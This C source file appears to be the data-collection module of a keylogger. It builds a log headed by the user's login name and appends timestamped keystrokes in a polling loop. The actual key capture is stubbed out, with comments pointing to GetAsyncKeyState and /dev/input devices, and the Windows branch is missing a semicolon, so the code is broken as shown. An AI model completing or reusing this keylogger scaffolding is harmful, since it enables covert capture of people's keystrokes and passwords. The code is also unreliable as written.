#include "../include/input.h"
#include "../include/utils.h"

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/time.h>
#endif

#ifndef _WIN32
struct input_event
{
    struct timeval time;
    uint16_t type;
    uint16_t code;
    int32_t value;
};
#endif

static bool is_any_key_pressed(char *key_pressed)
{
#ifdef _WIN32
    // while / for loop
    // GetAsyncKeyState(...);
    *key_pressed = 'x'; 
    return false
#else
    // while / for loop
    // /dev/input/eventX
    *key_pressed = 'x'; 
    return false;
#endif
}

// void get_data() return data using this format:
/*
---@getlogin---
[datetime]: 'key1'\n
[datetime]: 'key2'\n
...
*/
void get_data(char *buffer, size_t max_size)
{
    if (!buffer || !max_size) { return; }

    char username_buffer[32];
    get_username(username_buffer, sizeof(username_buffer));

    int32_t header_len = snprintf(buffer, max_size, "---@%s---\n", username_buffer);
    
    // buffer too small
    if (header_len < 0 || (size_t)header_len >= max_size)
    {
        buffer[0] = '\0'; 
        return;
    }

    size_t current_size = (size_t)header_len;

    char key_pressed;
    const size_t SAFETY_MARGIN = 64; 

    while ((current_size + SAFETY_MARGIN) < max_size)
    {
        if (is_any_key_pressed(&key_pressed))
        {
            char time_buffer[32];
            get_time(time_buffer, sizeof(time_buffer));
            
            char line_buffer[64];
            
            int32_t len = snprintf(line_buffer, sizeof(line_buffer), 
                                   "[%s]: '%c'\n", time_buffer, key_pressed);

            if (len > 0 && len < (int32_t)sizeof(line_buffer))
            {
                memcpy(buffer + current_size, line_buffer, len);
                current_size += len;
                buffer[current_size] = '\0';
            }
        }

        sleep_ms(50);
    }
}

